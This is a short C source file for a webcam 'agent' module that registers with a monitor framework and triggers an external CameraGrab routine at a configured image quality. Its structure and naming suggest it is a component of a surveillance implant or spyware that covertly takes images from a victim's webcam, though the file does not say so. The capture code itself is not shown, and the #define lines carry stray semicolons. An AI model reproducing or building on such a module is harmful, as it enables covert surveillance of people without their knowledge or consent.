
extern void CameraGrab(DWORD quality);

#define CAM_IMG_QUALITY_LOW 0;
#define CAM_IMG_QUALITY_MED 50;
#define CAM_IMG_QUALITY_HI 100;

DWORD cam_image_quality = CAM_IMG_QUALITY_MED;

DWORD __stdcall PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		CameraGrab(cam_image_quality);

	return 1;
}

DWORD __stdcall PM_WebCamInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	cam_image_quality = CAM_IMG_QUALITY_MED; // Lo dovrebbe prendere dal file di configurazione
	PM_WebCamStartStop(bStartFlag, TRUE);
	return 1;
}

void PM_WebCamRegister()
{
	AM_MonitorRegister(PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);
}